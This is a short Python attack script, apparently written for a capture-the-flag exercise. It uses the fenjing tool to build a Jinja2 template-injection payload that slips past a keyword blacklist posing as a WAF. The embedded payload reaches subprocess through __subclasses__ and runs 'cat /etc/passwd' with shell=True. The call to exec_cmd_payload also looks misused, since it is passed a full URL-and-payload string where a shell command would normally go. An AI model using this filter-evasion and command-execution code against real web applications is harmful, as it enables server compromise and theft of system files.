from fenjing import exec_cmd_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = ['import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen', 'mro', 'cycler', 'joiner', 'u','x','g','args', 'get_flashed_messages', 'base', '[',']','builtins', 'namespace', 'self', 'url_for', 'getitem','.','eval','update','config','read','dict']
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "http://127.0.0.1:5000/?c={{''.__class__.__mro__[1].__subclasses__()[456]('cat /etc/passwd',shell=True,stdout=-1)|attr('communicate')()}}")

    open("output.txt", "w").write(shell_payload)
    print(f"{shell_payload=}")
